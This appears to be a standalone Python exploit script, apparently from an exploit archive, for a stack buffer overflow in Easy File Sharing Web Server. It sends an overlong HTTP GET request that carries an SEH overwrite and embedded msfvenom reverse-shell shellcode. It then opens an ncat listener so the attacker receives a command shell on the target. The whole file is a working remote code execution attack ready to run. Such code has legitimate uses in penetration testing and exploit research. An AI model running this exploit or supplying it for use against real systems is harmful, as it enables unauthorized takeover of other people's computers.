#!/usr/bin/python
# Easy File Sharing Web Server
# Using ImageLoad.dll
# Praise be to the shell!
# Pretty much entirely based on ch3rn0byl's exploit
# Tested on Windows 7 and Windows 10
# The hardest part was finding the opcode !
import socket
from subprocess import call
from time import sleep

HOST = "192.168.1.232"
PORT = 80

# msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.232 lport=54321 -n 20 -f python -a x86 --platform windows -b '\x00\x20\x25\x2b\x2f\x5c'
buf =  ""
buf += "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
buf += "\x13\x47\x82\xbd\xec\x83\xeb\xfc\xe2\xf4\xbb\x6a"
buf += "\x3f\xec\x47\x82\xdd\x65\xa2\xb3\x7d\x88\xcc\xd2"
buf += "\x8d\x67\x15\x8e\x36\xbe\x53\x09\xcf\xc4\x48\x35"
buf += "\xf7\xca\x76\x7d\x11\xd0\x26\xfe\xbf\xc0\x67\x43"
buf += "\x72\xe1\x46\x45\x5f\x1e\x15\xd5\x36\xbe\x57\x09"
buf += "\xf7\xd0\xcc\xce\xac\x94\xa4\xca\xbc\x3d\x16\x09"
buf += "\xe4\xcc\x46\x51\x36\xa5\x5f\x61\x87\xa5\xcc\xb6"
buf += "\x36\xed\x91\xb3\x42\x40\x86\x4d\xb0\xed\x80\xba"
buf += "\x5d\x99\xb1\x81\xc0\x14\x7c\xff\x99\x99\xa3\xda"
buf += "\x36\xb4\x63\x83\x6e\x8a\xcc\x8e\xf6\x67\x1f\x9e"
buf += "\xbc\x3f\xcc\x86\x36\xed\x97\x0b\xf9\xc8\x63\xd9"
buf += "\xe6\x8d\x1e\xd8\xec\x13\xa7\xdd\xe2\xb6\xcc\x90"
buf += "\x56\x61\x1a\xea\x8e\xde\x47\x82\xd5\x9b\x34\xb0"
buf += "\xe2\xb8\x2f\xce\xca\xca\x40\x7d\x68\x54\xd7\x83"
buf += "\xbd\xec\x6e\x46\xe9\xbc\x2f\xab\x3d\x87\x47\x7d"
buf += "\x68\xbc\x17\xd2\xed\xac\x17\xc2\xed\x84\xad\x8d"
buf += "\x62\x0c\xb8\x57\x2a\x86\x42\xea\x7d\x44\x46\x6a"
buf += "\xd5\xee\x47\x56\x8c\x65\xa1\xe8\xad\xba\x10\xea"
buf += "\x24\x49\x33\xe3\x42\x39\xc2\x42\xc9\xe0\xb8\xcc"
buf += "\xb5\x99\xab\xea\x4d\x59\xe5\xd4\x42\x39\x2f\xe1"
buf += "\xd0\x88\x47\x0b\x5e\xbb\x10\xd5\x8c\x1a\x2d\x90"
buf += "\xe4\xba\xa5\x7f\xdb\x2b\x03\xa6\x81\xed\x46\x0f"
buf += "\xf9\xc8\x57\x44\xbd\xa8\x13\xd2\xeb\xba\x11\xc4"
buf += "\xeb\xa2\x11\xd4\xee\xba\x2f\xfb\x71\xd3\xc1\x7d"
buf += "\x68\x65\xa7\xcc\xeb\xaa\xb8\xb2\xd5\xe4\xc0\x9f"
buf += "\xdd\x13\x92\x39\x4d\x59\xe5\xd4\xd5\x4a\xd2\x3f"
buf += "\x20\x13\x92\xbe\xbb\x90\x4d\x02\x46\x0c\x32\x87"
buf += "\x06\xab\x54\xf0\xd2\x86\x47\xd1\x42\x39"

crash = "A" * 4061
crash += "\xeb\x06\x90\x90"
crash += "\xff\x28\x02\x10"
crash += "D" * (5500 - 4061 - 4 - len(buf))
crash += buf

payload = "GET {} HTTP/1.0\r\n\r\n".format(crash)

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))
	data = s.recv(1024)
	print "[x] {}".format(data)
	s.send(payload)
	s.close()
	print "[x] Payload delivered"
	print "[*] Connecting to target...\n"
	try:
		sleep(1)
		call(["ncat", "-vlnp", "54321"])
	except:
		print "[!] Couldn't connect to target"
except:
	print "[!] Connection failed"
